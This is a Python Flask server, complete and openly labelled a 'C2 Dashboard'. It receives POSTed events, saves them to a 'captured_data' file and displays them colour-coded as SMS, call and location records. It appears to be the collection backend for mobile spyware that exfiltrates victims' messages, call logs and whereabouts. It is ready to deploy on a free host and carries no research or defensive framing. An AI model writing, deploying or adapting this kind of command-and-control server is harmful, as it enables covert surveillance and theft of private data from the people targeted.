from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import json
import os

app = Flask(__name__)

# In-memory storage (free Render instances restart occasionally)
log_entries = []

# Try to load existing data from disk
try:
    with open('/tmp/captured_data.json') as f:
        log_entries = json.load(f)
except:
    pass

def save_to_disk():
    with open('/tmp/captured_data.json', 'w') as f:
        json.dump(log_entries, f, indent=2)

@app.route('/api/log', methods=['GET'])
def get_logs():
    return jsonify({
        'total_events': len(log_entries),
        'events': log_entries
    })

@app.route('/api/log', methods=['POST'])
def post_log():
    try:
        data = request.get_json()
        data['server_received_at'] = datetime.now().isoformat()
        log_entries.append(data)
        
        # Cap at 1000 events
        if len(log_entries) > 1000:
            log_entries.pop(0)
        
        save_to_disk()
        print(f"[+] Received: {json.dumps(data, indent=2)}")
        
        return jsonify({'status': 'ok', 'total_events': len(log_entries)})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/')
def dashboard():
    events_html = ''
    for event in reversed(log_entries):
        event_type = event.get('type', 'unknown')
        css_class = ''
        if 'sms' in event_type.lower():
            css_class = 'sms'
        elif 'call' in event_type.lower():
            css_class = 'call'
        elif 'location' in event_type.lower():
            css_class = 'location'
        
        events_html += f'''
        <div class="event {css_class}">
            <div class="timestamp">{event.get('timestamp', '')} | {event_type}</div>
            <pre>{json.dumps(event.get('data', {}), indent=2)}</pre>
        </div>'''
    
    html = f'''<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard</title>
    <meta http-equiv="refresh" content="10">
    <style>
        body {{ font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }}
        .event {{ border: 1px solid #333; padding: 10px; margin: 8px 0; border-radius: 5px; }}
        .sms {{ border-left: 4px solid cyan; }}
        .call {{ border-left: 4px solid yellow; }}
        .location {{ border-left: 4px solid lime; }}
        .timestamp {{ color: #888; font-size: 0.8em; margin-bottom: 4px; }}
        pre {{ margin: 0; white-space: pre-wrap; word-break: break-all; }}
        h1 {{ color: #0f0; }}
    </style>
</head>
<body>
    <h1>C2 Dashboard</h1>
    <p>Total events: {len(log_entries)}</p>
    <hr>
    {events_html or '<p>No events yet.</p>'}
</body>
</html>'''
    
    return html

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)